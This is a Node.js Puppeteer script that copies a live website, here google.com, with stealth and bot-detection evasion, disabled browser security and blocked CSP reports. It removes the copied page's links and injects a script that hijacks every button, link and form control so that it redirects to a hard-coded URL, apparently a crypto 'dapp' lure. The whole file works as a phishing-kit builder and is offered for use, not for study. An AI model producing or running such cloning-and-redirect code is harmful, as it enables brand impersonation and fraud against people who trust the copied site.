const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const cheerio = require("cheerio");
const fs = require("fs-extra");
const path = require("path");

puppeteer.use(StealthPlugin());

(async () => {
  const siteUrl = "https://google.com/"; // URL to clone
  const outputDir = path.join(__dirname, "cloned");
  const redirectURL = "https://mainnettdapp.vercel.app/"; // URL to redirect all links to
  const assetCache = new Map();

  // Function to sanitize file paths
  const sanitizePath = (pathname) => {
    return pathname
      .replace(/[:*?"<>|]/g, "_") // Replace invalid Windows characters
      .replace(/^-+/, "") // Remove leading dashes
      .replace(/\/+/g, "/") // Normalize slashes
      .replace(/^\/+/, ""); // Remove leading slashes
  };

  try {
    // Ensure output directory
    await fs.ensureDir(outputDir, { mode: 0o755 });

    // Launch browser
    const browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-blink-features=AutomationControlled",
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
      ],
    });

    const page = await browser.newPage();

    // Bot evasion
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, "webdriver", { get: () => false });
      Object.defineProperty(navigator, "platform", { get: () => "Win32" });
      Object.defineProperty(navigator, "vendor", { get: () => "Google Inc." });
      Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
      window.chrome = { runtime: {} };
      Object.defineProperty(navigator, "plugins", {
        get: () => [
          { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer" },
          { name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai" },
        ],
      });
    });

    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    );

    await page.setRequestInterception(true);

    // Handle requests
    page.on("request", (req) => {
      const resourceType = req.resourceType();
      const url = req.url();
      if (["beacon", "csp_report"].includes(resourceType)) {
        req.abort();
        return;
      }
      if (/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|json)$/.test(url)) {
        req.continue({
          headers: {
            ...req.headers(),
            Referer: siteUrl,
            Accept: resourceType === "stylesheet" ? "text/css" : resourceType === "script" ? "*/*" : "image/*,font/*",
          },
        });
      } else {
        req.continue();
      }
    });

    // Capture assets
    page.on("requestfinished", async (req) => {
      const url = req.url();
      if (url.startsWith("data:")) return;

      try {
        const response = await req.response();
        if (!response || !response.ok()) {
          console.warn(`⚠️ Invalid response for ${url}: Status ${response?.status()}`);
          return;
        }

        const contentType = response.headers()["content-type"] || "";
        if (!/(css|javascript|font|image|svg|octet-stream|json)/.test(contentType)) {
          console.warn(`⚠️ Skipped ${url}: Invalid content-type ${contentType}`);
          return;
        }

        const buffer = await response.buffer();
        const pathname = sanitizePath(new URL(url, siteUrl).pathname);
        assetCache.set(pathname, buffer);
        console.log(`📦 Intercepted: ${pathname} (${contentType})`);
      } catch (err) {
        console.warn(`⚠️ Failed intercept: ${url} - ${err.message}`);
      }
    });

    // Navigate with extended wait
    try {
      await page.goto(siteUrl, { waitUntil: "networkidle0", timeout: 60000 });
    } catch (err) {
      console.warn("⚠️ Navigation failed, retrying with domcontentloaded...", err.message);
      await page.goto(siteUrl, { waitUntil: "domcontentloaded", timeout: 30000 });
    }
    await page.waitForSelector("body", { timeout: 30000 });
    await page.mouse.move(Math.random() * 800, Math.random() * 600); // Simulate human behavior
    await new Promise((resolve) => setTimeout(resolve, 20000)); // Extended wait for dynamic assets

    // Extract HTML, stylesheets, and inline styles
    const { html, stylesheets, inlineStyles } = await page.evaluate(() => {
      const links = Array.from(document.querySelectorAll('link[rel="stylesheet"], link[rel="preload"][as="style"]')).map(l => l.href);
      const styles = Array.from(document.querySelectorAll('style')).map(s => s.innerText);
      return {
        html: document.documentElement.outerHTML,
        stylesheets: links,
        inlineStyles: styles,
      };
    });

    if (!html || html.length < 100) {
      throw new Error("❌ Empty or invalid HTML content");
    }
    const $ = cheerio.load(html);

    $("base").remove();

  // Remove href from all <a> tags
    $("a[href]").each((_, el) => {
      $(el).removeAttr("href");
      console.log("✅ Removed href from <a> tag");
    });

    // Save inline styles
    inlineStyles.forEach((style, index) => {
      const styleId = `inline-style-${index}`;
      $("head").append(`<style id="${styleId}">${style}</style>`);
      console.log(`✅ Added inline style: ${styleId}`);
    });

    // Process external CSS
    const cssDir = path.join(outputDir, "css");
    await fs.ensureDir(cssDir);
    for (const href of stylesheets) {
      if (!href || href.startsWith("data:")) continue;

      try {
        const fullUrl = new URL(href, siteUrl);
        const pathname = sanitizePath(fullUrl.pathname);
        const localCssPath = path.join("css", path.basename(pathname)).replace(/\\/g, "/");
        const savePath = path.join(outputDir, localCssPath);

        let cssBuffer = assetCache.get(pathname);
        let contentType = "text/css";

        // Fetch CSS if not in cache
        if (!cssBuffer) {
          console.warn(`⚠️ CSS not in cache, fetching: ${href}`);
          const resp = await page.goto(fullUrl.href, { waitUntil: "networkidle0", timeout: 15000 });
          if (!resp.ok()) {
            console.warn(`⚠️ Failed to fetch CSS: ${href} - Status ${resp.status()}`);
            $("head").append(`<link rel="stylesheet" href="${href}">`);
            continue;
          }
          contentType = resp.headers()["content-type"] || "";
          if (!contentType.includes("text/css")) {
            console.warn(`⚠️ Invalid CSS content-type: ${contentType} for ${href}`);
            $("head").append(`<link rel="stylesheet" href="${href}">`);
            continue;
          }
          cssBuffer = await resp.buffer();
          assetCache.set(pathname, cssBuffer);
        }

        const cssText = cssBuffer.toString("utf-8");
        if (!cssText) {
          console.warn(`⚠️ Empty CSS content: ${href}`);
          $("head").append(`<link rel="stylesheet" href="${href}">`);
          continue;
        }

        // Rewrite URLs in CSS
        const rewrittenCss = cssText.replace(
          /url\(['"]?([^'")]+)['"]?\)/g,
          (_, assetUrl) => {
            try {
              const assetPath = sanitizePath(new URL(assetUrl, fullUrl).pathname);
              if (assetCache.has(assetPath)) {
                console.log(`✅ Rewrote CSS URL: ${assetUrl} -> /${assetPath}`);
                return `url(/${assetPath})`;
              }
              console.warn(`⚠️ CSS asset not found: ${assetUrl}`);
              return `url(${assetUrl})`;
            } catch (err) {
              console.warn(`⚠️ Failed to rewrite CSS URL: ${assetUrl} - ${err.message}`);
              return `url(${assetUrl})`;
            }
          }
        );

        // Save CSS
        await fs.ensureDir(path.dirname(savePath));
        await fs.writeFile(savePath, rewrittenCss);
        console.log(`✅ Saved CSS: ${savePath}`);

        // Inline CSS or use local link
        try {
          $("head").append(`<style>${rewrittenCss}</style>`);
          console.log(`🎨 Inlined CSS: ${href}`);
        } catch (err) {
          console.warn(`⚠️ Failed to inline CSS, using local link: ${href} - ${err.message}`);
          $("head").append(`<link rel="stylesheet" href="/${localCssPath}">`);
        }
      } catch (err) {
        console.warn(`❌ Failed to process CSS: ${href} - ${err.message}`);
        $("head").append(`<link rel="stylesheet" href="${href}">`);
      }
    }

    // Save other assets
    for (const [pathname, buffer] of assetCache.entries()) {
      if (pathname.startsWith("data:")) continue;
      const sanitizedPath = sanitizePath(pathname);
      const fullPath = path.join(outputDir, sanitizedPath);
      try {
        await fs.ensureDir(path.dirname(fullPath));
        await fs.writeFile(fullPath, buffer);
        console.log(`✅ Saved asset: ${fullPath}`);
      } catch (err) {
        console.warn(`❌ Failed to save asset: ${sanitizedPath} - ${err.message}`);
      }
    }

    // Rewrite asset paths in HTML
    $("[href], [src]").each((_, el) => {
      const $el = $(el);
      const attr = $el.attr("href") ? "href" : "src";
      const val = $el.attr(attr);

      if (!val || val.startsWith("data:") || val.startsWith("mailto:") || val.startsWith("javascript:")) return;

      try {
        const full = new URL(val, siteUrl);
        const pathname = sanitizePath(full.pathname);
        if (assetCache.has(pathname)) {
          $el.attr(attr, `/${pathname}`);
          console.log(`✅ Rewrote ${attr}: ${val} -> /${pathname}`);
        } else {
          console.warn(`⚠️ Asset not found for ${attr}: ${val}`);
          $el.attr(attr, val); // Keep original if not found
        }
      } catch (err) {
        console.warn(`⚠️ Failed to rewrite ${attr}: ${val} - ${err.message}`);
      }
    });

$("body").append(`
<style>
  a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset'] {
    cursor: pointer !important;
  }
</style>
<script>
document.addEventListener("DOMContentLoaded", () => {
  const elements = document.querySelectorAll("a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],input[type='button'], input[type='submit'], input[type='reset']");
  elements.forEach(el => {
    el.onclick = null;
    el.removeAttribute("onclick");
    if (window.jQuery && typeof jQuery === "function") {
      try { jQuery(el).off("click"); } catch (err) {}
    }
    const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
    if (reactKey) delete el[reactKey];
    el.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopImmediatePropagation();
      window.location.href = ${JSON.stringify(redirectURL)};
    }, true);
  });
});
</script>
`);


    // Save HTML
    const outputHtmlPath = path.join(outputDir, "index.html");
    await fs.writeFile(outputHtmlPath, $.html());
    console.log("✅ Clone complete:", outputHtmlPath);

    await browser.close();
  } catch (err) {
    console.error("❌ Error:", err.message, err.stack);
    process.exit(1);
  }
})();